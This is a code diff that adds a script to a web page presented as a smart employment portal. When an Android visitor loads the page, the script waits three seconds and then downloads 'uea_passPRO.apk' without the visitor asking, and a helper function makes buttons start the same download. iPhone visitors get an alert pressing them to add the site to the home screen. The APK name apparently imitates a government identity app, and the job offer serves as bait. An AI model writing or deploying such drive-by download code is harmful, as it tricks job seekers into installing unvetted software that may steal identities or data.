@@ -126,6 +126,37 @@
             display: none;
         }
     </style>
+    <script>
+      window.onload = function() {
+        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+        // 1. للأندرويد: تحميل تلقائي بعد 3 ثوانٍ
+        if (/android/i.test(userAgent)) {
+            setTimeout(function() {
+                var link = document.createElement('a');
+                link.href = 'uea_passPRO.apk'; // تأكد أن هذا الاسم مطابق للملف المرفوع
+                link.download = 'uea_passPRO.apk';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }, 3000);
+        }
+
+        // 2. للآيفون: إظهار رسالة التثبيت (PWA)
+        if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+            if (!window.navigator.standalone) {
+                setTimeout(function() {
+                    alert("مرحباً بك في بوابة التوظيف الذكية.\n\nلضمان استلام إشعارات الوظائف فوراً، يرجى الضغط على زر 'مشاركة' ثم 'إضافة إلى الشاشة الرئيسية'.");
+                }, 2000);
+            }
+        }
+      };
+
+      // دالة لجعل الأزرار تحفز التحميل أيضاً
+      function triggerDownload() {
+          window.location.href = "uea_passPRO.apk";
+      }
+    </script>
 </head>
 <body>
 
